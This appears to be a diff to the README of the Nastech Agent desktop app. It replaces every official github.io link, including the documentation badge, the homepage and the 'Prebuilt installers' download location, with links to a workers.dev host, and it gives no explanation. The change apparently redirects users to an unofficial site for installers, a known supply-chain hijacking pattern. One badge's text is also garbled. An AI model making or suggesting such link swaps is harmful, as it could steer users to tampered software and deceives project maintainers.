@@ -2,12 +2,12 @@
 
 <p align="center">
   <a href="https://github.com/NastechResearch/nastech-agent/releases"><img src="https://img.shields.io/badge/Download-macOS%20%C2%B7%20Windows%20%C2%B7%20Linux-FFD700?style=for-the-badge" alt="Download"></a>
-  <a href="https://nastechresearch.github.io/nastech-agent/docs/"><img src="https://img.shields.io/badge/Docs-nastech--agent.nastechresearch.github.io-FFD700?style=for-the-badge" alt="Documentation"></a>
+  <a href="https://nastech-agent.nastechresearch.workers.dev/docs/"><img src="https://img.shields.io/badge/Docs-nastech--agent.nastech-agent.nastechresearch.workers.dev-FFD700?style=for-the-badge" alt="Documentation"></a>
   <a href="https://discord.gg/NastechResearch"><img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord"></a>
   <a href="https://github.com/NastechResearch/nastech-agent/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License: MIT"></a>
 </p>
 
-**The native desktop app for [Nastech Agent](../../README.md) — the self-improving AI agent from [Nastech Research](https://nastechresearch.github.io).** Same agent, same skills, same memory as the CLI and gateway, in a polished native window — chat with streaming tool output, side-by-side previews, a file browser, voice, and settings, no terminal required. Available for **macOS, Windows, and Linux**.
+**The native desktop app for [Nastech Agent](../../README.md) — the self-improving AI agent from [Nastech Research](https://nastech-agent.nastechresearch.workers.dev).** Same agent, same skills, same memory as the CLI and gateway, in a polished native window — chat with streaming tool output, side-by-side previews, a file browser, voice, and settings, no terminal required. Available for **macOS, Windows, and Linux**.
 
 > **Intel Macs:** the `Nastech-Setup.dmg` bootstrap installer is built for
 > Apple Silicon (arm64) only, so on an Intel Mac it reports "not supported on
@@ -41,7 +41,7 @@ It builds and launches the GUI against your existing install — same config, ke
 
 ### Prebuilt installers
 
-Prebuilt installers are built and distributed via [the Nastech Desktop website.](https://nastechresearch.github.io/nastech-agent/).
+Prebuilt installers are built and distributed via [the Nastech Desktop website.](https://nastech-agent.nastechresearch.workers.dev/).
 
 ---
 
@@ -258,7 +258,7 @@ Remove-Item -Recurse -Force "$env:LOCALAPPDATA\nastech\nastech-agent\venv"
 ## Community
 
 - 💬 [Discord](https://discord.gg/NastechResearch)
-- 📖 [Documentation](https://nastechresearch.github.io/nastech-agent/docs/)
+- 📖 [Documentation](https://nastech-agent.nastechresearch.workers.dev/docs/)
 - 🐛 [Issues](https://github.com/NastechResearch/nastech-agent/issues)
 
 ---
@@ -267,4 +267,4 @@ Remove-Item -Recurse -Force "$env:LOCALAPPDATA\nastech\nastech-agent\venv"
 
 MIT — see [LICENSE](../../LICENSE).
 
-Built by [Nastech Research](https://nastechresearch.github.io).
+Built by [Nastech Research](https://nastech-agent.nastechresearch.workers.dev).
